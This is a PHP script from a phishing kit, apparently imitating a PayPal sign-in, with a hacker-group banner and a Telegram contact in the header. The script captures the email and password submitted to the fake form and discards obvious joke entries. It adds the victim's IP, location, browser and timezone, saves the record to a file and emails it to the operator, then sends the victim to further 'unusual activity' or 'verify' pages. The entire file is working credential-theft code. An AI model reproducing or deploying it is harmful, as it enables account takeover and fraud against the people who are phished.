<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
session_start(); 
include '../mine.php';
include '../bot.php';
$pas=$_POST['PWD'];
if(isset($_POST['EML'])&&isset($_POST['PWD'])){
$check2 = "true";
if (strpos($pas,'fuck') !== false || strpos($pas,'1234') !== false || strpos($pas,'4321') !== false || strpos($pas,'qwer') !== false || strpos($pas,'rewq') !== false || strpos($pas,'gotofindgoodjob') !== false || strpos($pas,'stupid') !== false || strpos($pas,'spammer') !== false || strpos($pas,'fuckingspam') !== false || strpos($pas,'spam') !== false || strpos($pas,'sonofbitch') !== false || strpos($pas,'   ') !== false || strpos($pas,'googlebot') !== false) {
		$check3 = "false";
	}else{
			$check3 = "true";
	}
}
if(isset($_POST['EML'])&&isset($_POST['PWD'])){
if ($check2=="true"&&$check3=="true") {
	$_SESSION['screen']=$_POST['screen'];
	$_SESSION['EML']=$_POST['EML'];
	$_SESSION['PWD']=$_POST['PWD'];
	
    $email = $_POST['EML'];
    $pass = $_POST['PWD'];
    $ip = $_SESSION['ip'];
    $city = $_SESSION['ip_city'];
    $country = $_SESSION['ip_countryName'];
    $currency = $_SESSION['currency'];
    $browser = $_SESSION['browser'];
    $os = $_SESSION['os'];
    $screen = $_SESSION['screen'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $timezone = $_SESSION['ip_timezone'];
    $time = "".date("d/m/Y h:i:sa")." GMT";
    
	
	$msg="
+ ------------------------------------------+
+ ---------- Tele @dataspecialist --------- +
| EMAIL		: $email
| PASS		: $pass
+ ------------------------------------------+
+ --------------- IP Info ----------------- +
| IP ADDRESS	: $ip
| LOCATION	: $city , $country
| CURRENCY    : $currency
| BROWSER		: $browser on $os
| SCREEN		: $screen
| USER AGENT	: $user_agent
| TIMEZONE	: $timezone
| TIME		: $time
+ ------------------------------------------+
	";
	
	if ($saveintext=="yes") {
    	$save=fopen("../../".$filename.".txt","a+");
    	fwrite($save,$msg);
    	fclose($save);
    }
    
	$subject="-".$scamname."PP LOGIN [".$_POST['EML']."] From [".$_SESSION['ip_countryName']."]";
	mail($to,$subject,$msg);
	
    if ($show_unusual_activity=="yes") {
	    exit(header("Location: ../../app/unusual_activity.php"));
    }else{
	    exit(header("Location: ../../app/verify.php"));
        }
}else{
	exit(header("Location: ../../app/signin.php?invalid.php"));

	}
}else{
	     header('HTTP/1.0 404 Not Found');

}
?>